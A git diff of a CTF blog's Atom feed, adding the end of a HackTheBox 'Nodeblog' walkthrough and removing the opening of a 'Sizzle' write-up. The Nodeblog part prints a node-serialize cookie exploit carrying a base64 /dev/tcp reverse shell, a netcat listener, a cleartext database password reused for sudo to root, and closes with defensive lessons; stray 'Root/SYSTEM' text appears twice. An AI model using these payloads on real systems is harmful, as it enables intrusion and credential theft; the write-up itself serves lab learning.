+    &lt;span class=&quot;k&quot;&gt;if &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sign&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;crypto&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;createHash&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;md5&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;update&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;cookie_secret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;user&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;digest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;It unserializes our own provided cookie which we can easily exploit (especialRoot/SYSTEMly as we have a valid cookie and the secrets to build a custom one).&lt;/p&gt;
+
+&lt;p&gt;Let’s build the payload first:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;/bin/bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.14.127/1337 0&amp;gt;&amp;amp;1&quot;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;base64&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; 0
+L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjEyNy8xMzM3IDA+JjEK
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;lookatme&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;_$$ND_FUNC$$_function (){ require(&apos;child_process&apos;).exec(&apos;echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjEyNy8xMzM3IDA+JjEK|base64 -d|bash&apos;,function(error, stdout, stderr) { console.log(stdout) }); }()&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Urlencode:&lt;/p&gt;
+
+&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;B&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;22&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;lookatme&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;22&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;A&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;22&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;_&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;24&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;24&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ND_FUNC&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;24&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;24&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;_function&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;B&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;require&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;child_process&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;exec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;echo%20L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjEyNy8xMzM3IDA%2BJjEK%7Cbase64%20-d%7Cbash&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;Cfunction&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;error&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;C&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;stdout&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;C&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;stderr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;B&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;stdout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;D&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;B&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;D&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;22&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;D&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Now start a netcat listener:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nc &lt;span class=&quot;nt&quot;&gt;-lnvp&lt;/span&gt; 1337
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Change your cookie and go to any page like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/&lt;/code&gt;:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/ctf/data/nodeblog-9.png&quot; alt=&quot;nodeblog-9.htb&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;We couldn’t read &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;~/user.txt&lt;/code&gt; for strange reasons. Looking at the permissions shows likely it was pointing to a user that is non-existent on the machine:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;admin@nodeblog:/opt/blog&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt; ~
+&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt;: cannot access &lt;span class=&quot;s1&quot;&gt;&apos;/home/admin/.&apos;&lt;/span&gt;: Permission denied
+&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt;: cannot access &lt;span class=&quot;s1&quot;&gt;&apos;/home/admin/..&apos;&lt;/span&gt;: Permission denied
+&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt;: cannot access &lt;span class=&quot;s1&quot;&gt;&apos;/home/admin/.bash_logout&apos;&lt;/span&gt;: Permission denied
+&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt;: cannot access &lt;span class=&quot;s1&quot;&gt;&apos;/home/admin/.bashrc&apos;&lt;/span&gt;: Permission denied
+&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt;: cannot access &lt;span class=&quot;s1&quot;&gt;&apos;/home/admin/.profile&apos;&lt;/span&gt;: Permission deniedRoot/SYSTEM
+&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt;: cannot access &lt;span class=&quot;s1&quot;&gt;&apos;/home/admin/.cache&apos;&lt;/span&gt;: Permission denied
+&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt;: cannot access &lt;span class=&quot;s1&quot;&gt;&apos;/home/admin/.sudo_as_admin_successful&apos;&lt;/span&gt;: Permission denied
+&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt;: cannot access &lt;span class=&quot;s1&quot;&gt;&apos;/home/admin/.bash_history&apos;&lt;/span&gt;: Permission denied
+&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt;: cannot access &lt;span class=&quot;s1&quot;&gt;&apos;/home/admin/.pm2&apos;&lt;/span&gt;: Permission denied
+&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt;: cannot access &lt;span class=&quot;s1&quot;&gt;&apos;/home/admin/.mongorc.js&apos;&lt;/span&gt;: Permission denied
+&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt;: cannot access &lt;span class=&quot;s1&quot;&gt;&apos;/home/admin/.dbshell&apos;&lt;/span&gt;: Permission denied
+&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt;: cannot access &lt;span class=&quot;s1&quot;&gt;&apos;/home/admin/user.txt&apos;&lt;/span&gt;: Permission denied
+&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt;: cannot access &lt;span class=&quot;s1&quot;&gt;&apos;/home/admin/.viminfo&apos;&lt;/span&gt;: Permission denied
+total 0
+d????????? ? ? ? ?            ? &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+d????????? ? ? ? ?            ? ..
+-????????? ? ? ? ?            ? .bash_history
+-????????? ? ? ? ?            ? .bash_logout
+-????????? ? ? ? ?            ? .bashrc
+d????????? ? ? ? ?            ? .cache
+-????????? ? ? ? ?            ? .dbshell
+-????????? ? ? ? ?            ? .mongorc.js
+d????????? ? ? ? ?            ? .pm2
+-????????? ? ? ? ?            ? .profile
+-????????? ? ? ? ?            ? .sudo_as_admin_successful
+-????????? ? ? ? ?            ? .viminfo
+-????????? ? ? ? ?            ? user.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;So let’s gain ownership again:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;admin@nodeblog:/opt/blog&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;chmod&lt;/span&gt; +rwx ~
+admin@nodeblog:/opt/blog&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt; ~
+total 36
+drwxr-xr-x 1 admin admin   220 Jan  3  2022 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+drwxr-xr-x 1 root  root     10 Dec 27  2021 ..
+&lt;span class=&quot;nt&quot;&gt;-rw-------&lt;/span&gt; 1 admin admin  1863 Dec 31  2021 .bash_history
+&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 admin admin   220 Feb 25  2020 .bash_logout
+&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 admin admin  3771 Feb 25  2020 .bashrc
+drwx------ 1 admin admin    40 Jul  2  2021 .cache
+&lt;span class=&quot;nt&quot;&gt;-rw-------&lt;/span&gt; 1 admin admin   125 Dec 13  2021 .dbshell
+&lt;span class=&quot;nt&quot;&gt;-rw-------&lt;/span&gt; 1 admin admin     0 Dec 13  2021 .mongorc.js
+drwxrwxr-x 1 admin admin   158 Jan  3  2022 .pm2
+&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 admin admin   807 Feb 25  2020 .profile
+&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 admin admin     0 Jul  2  2021 .sudo_as_admin_successful
+&lt;span class=&quot;nt&quot;&gt;-rw-------&lt;/span&gt; 1 admin admin 10950 Jan  3  2022 .viminfo
+&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 root  root     33 Jun 29 17:11 user.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Now we can read it:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;admin@nodeblog:/opt/blog&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; ~/user.txt
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;REDACTED]
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/ctf/data/nodeblog-10.png&quot; alt=&quot;nodeblog-10.htb&quot; /&gt;&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;-3-privilege-escalation-admin---root&quot;&gt;📈 3. Privilege Escalation (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin&lt;/code&gt; -&amp;gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt;)&lt;/h2&gt;
+
+&lt;p&gt;Running &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ps -aux&lt;/code&gt; reveals that mongodb is running locally:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mongodb      801  0.2  1.8 983452 76092 ?        Ssl  17:10   0:05 /usr/bin/mongod &lt;span class=&quot;nt&quot;&gt;--unixSocketPrefix&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/run/mongodb &lt;span class=&quot;nt&quot;&gt;--config&lt;/span&gt; /etc/mongodb.conf
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Let’s check it out:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;admin@nodeblog:~$ mongo
+mongo
+MongoDB shell version v3.6.8
+connecting to: mongodb://127.0.0.1:27017
+Implicit session: session { &quot;id&quot; : UUID(&quot;e37625b7-321d-4f73-ae2e-1e670d048e26&quot;) }
+MongoDB server version: 3.6.8
+show dbs
+admin   0.000GB
+blog    0.000GB
+config  0.000GB
+local   0.000GB
+use blog
+switched to db blog
+show collections
+articles
+users
+db.users.find()
+{ &quot;_id&quot; : ObjectId(&quot;61b7380ae5814df6030d2373&quot;), &quot;createdAt&quot; : ISODate(&quot;2021-12-13T12:09:46.009Z&quot;), &quot;username&quot; : &quot;admin&quot;, &quot;password&quot; : &quot;IppsecSaysPleaseSubscribe&quot;, &quot;__v&quot; : 0 }
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Admin’s password seems to be &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IppsecSaysPleaseSubscribe&lt;/code&gt;. I won’t subscribe tho :P&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;admin@nodeblog:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-S&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-S&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; password &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;admin: IppsecSaysPleaseSubscribe
+Matching Defaults entries &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;admin on nodeblog:
+    env_reset, mail_badpass,
+    &lt;span class=&quot;nv&quot;&gt;secure_path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/local/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/local/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/snap/bin
+
+User admin may run the following commands on nodeblog:
+    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ALL&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; ALL
+    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ALL : ALL&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; ALL
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Indeed. The credentials work and we can run anything as root. Let’s read &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/root/root.txt&lt;/code&gt; then:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;admin@nodeblog:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-S&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /root/root.txt
+&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-S&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /root/root.txt
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;REDACTED]
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/ctf/data/nodeblog-11.png&quot; alt=&quot;nodeblog-11.htb&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Easy game.&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;-learnings&quot;&gt;🧠 Learnings&lt;/h2&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;&lt;strong&gt;Sanitize Object Inputs for NoSQL:&lt;/strong&gt; To prevent NoSQL injection, ensure user inputs are validated as strict strings rather than blindly passing objects. Attackers can pass objects like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;{&quot;$ne&quot;: &quot;&quot;}&lt;/code&gt; to completely bypass authentication logic when queries aren’t sanitized or type-checked.&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Disable External Entities in XML Parsers:&lt;/strong&gt; Secure XML parsing by explicitly disabling external entity resolution (DTD/XXE defenses). This prevents attackers from using file URIs to read sensitive local system files or source code.&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Avoid Unsafe Deserialization:&lt;/strong&gt; Never use modules like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;node-serialize&lt;/code&gt; on untrusted user data like cookies. Passing manipulated objects to these functions can execute arbitrary JavaScript functions instantly. Stick to standard, safer data formats like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;JSON.parse()&lt;/code&gt;.&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Enforce Strong Password Hygiene:&lt;/strong&gt; Avoid storing sensitive credentials in cleartext within databases. Additionally, reuse of application passwords for administrative system logins (like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo&lt;/code&gt; access) drastically increases the impact of a database breach.&lt;/li&gt;
+&lt;/ol&gt;
 </content>
   </entry>
   
@@ -6804,813 +7212,6 @@ C:&lt;span class=&quot;se&quot;&gt;\&amp;gt;&lt;/span&gt;&lt;span class=&quot;nb
   &lt;li&gt;&lt;strong&gt;Restrict AppLocker / Script Policy Code-Signing Certs&lt;/strong&gt;: Code-signing certificates that are trusted to bypass system execution policies (like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AllSigned&lt;/code&gt;) must be strictly guarded; allowing standard users to find and use an administrative signing cert completely undermines script restriction policies.&lt;/li&gt;
   &lt;li&gt;&lt;strong&gt;Audit DCSync Rights&lt;/strong&gt;: Directory replication privileges must be restricted solely to Domain Controllers and high-privilege sync accounts; keeping this privilege on intermediate service accounts creates a direct path to full Active Directory takeover.&lt;/li&gt;
 &lt;/ol&gt;
-</content>
-  </entry>
-  
-  <entry>
-    <title>HackTheBox: Sizzle</title>
-    
-    <link href="http://localhost:4000/ctfs/htb-sizzle/"/>
-    <updated>2026-06-18T00:00:00+02:00</updated>
-    <id>http://localhost:4000/ctfs/htb-sizzle/</id>
-
-    
-    
-      <category term="Mission Log" label="CTF" />
-    
-    
-    <content type="html">&lt;h1 id=&quot;-sizzle&quot;&gt;🎯 Sizzle&lt;/h1&gt;
-
-&lt;table&gt;
-  &lt;tbody&gt;
-    &lt;tr&gt;
-      &lt;td&gt;&lt;strong&gt;OS:&lt;/strong&gt; Windows&lt;/td&gt;
-      &lt;td&gt;&lt;strong&gt;Difficulty:&lt;/strong&gt; Insane&lt;/td&gt;
-      &lt;td&gt;&lt;strong&gt;IP:&lt;/strong&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;10.129.23.236&lt;/code&gt;&lt;/td&gt;
-    &lt;/tr&gt;
-  &lt;/tbody&gt;
-&lt;/table&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/img/ctf/data/sizzle-htb.png&quot; alt=&quot;sizzle.htb&quot; /&gt;&lt;/p&gt;
-
-&lt;hr /&gt;
-
-&lt;h2 id=&quot;️-tldr--attack-chain&quot;&gt;⛓️ TL;DR / Attack Chain&lt;/h2&gt;
-
-&lt;ol&gt;
-  &lt;li&gt;&lt;strong&gt;Foothold:&lt;/strong&gt; Enumerated SMB anonymously and found write access to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/ZZ_ARCHIVE&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/Users/Public&lt;/code&gt;. Dropped malicious shortcut/SCF files to coerce authentication, captured &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;amanda&lt;/code&gt;’s NTLMv2 hash with Responder, and cracked it (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Ashare1972&lt;/code&gt;).&lt;/li&gt;
-  &lt;li&gt;&lt;strong&gt;Initial Access via ADCS:&lt;/strong&gt; WinRM blocked password logins (401 error). Logged into ADCS web enrollment (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/certsrv&lt;/code&gt;) as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;amanda&lt;/code&gt;, generated a CSR via OpenSSL, signed a user certificate, and used it with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;evil-winrm --ssl&lt;/code&gt; to pop a shell.&lt;/li&gt;
